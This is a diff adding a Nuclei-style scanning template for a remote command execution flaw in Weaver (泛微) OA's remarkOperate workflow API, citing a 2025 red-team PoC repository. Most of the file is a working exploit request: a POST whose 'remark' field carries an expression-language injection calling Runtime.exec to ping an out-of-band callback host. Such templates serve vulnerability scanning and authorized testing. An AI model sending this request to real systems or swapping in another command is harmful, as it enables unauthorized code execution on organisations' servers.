@@ -1,0 +1,52 @@
+id: weaver-remarkOperate-rce
+info:
+  name: 泛微remarkOperate远程命令执行
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/c8595f9799ad8d5fa795b37c4baefef84902f665/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEremarkOperate%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.txt#L4
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: oob,weaver,oa
+
+http:
+  - raw:
+      - |
+        POST /api/workflow/reqform/remarkOperate HTTP/1.1
+        Host: {{Hostname}}
+
+        {
+          "operate": "save",
+          "field5": "5241,5240",
+          "IsBeForwardSubmitAlready": "1",
+          "IsBeForwardAlready": "0",
+          "IsSubmitedOpinion": "1",
+          "IsBeForwardTodo": "0",
+          "forwardflag": "1",
+          "requestid": "5288726",
+          "nodeid": "11995",
+          "f_weaver_belongto_userid": "5240",
+          "f_weaver_belongto_usertype": "0",
+          "signworkflowids": "",
+          "signdocids": "",
+          "remarkLocation": "",
+          "remark": "${T(java.lang.Runtime).getRuntime().exec('ping {{interactsh-url}}')}",
+          "remindTypes": "0,2"
+        }
+      
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
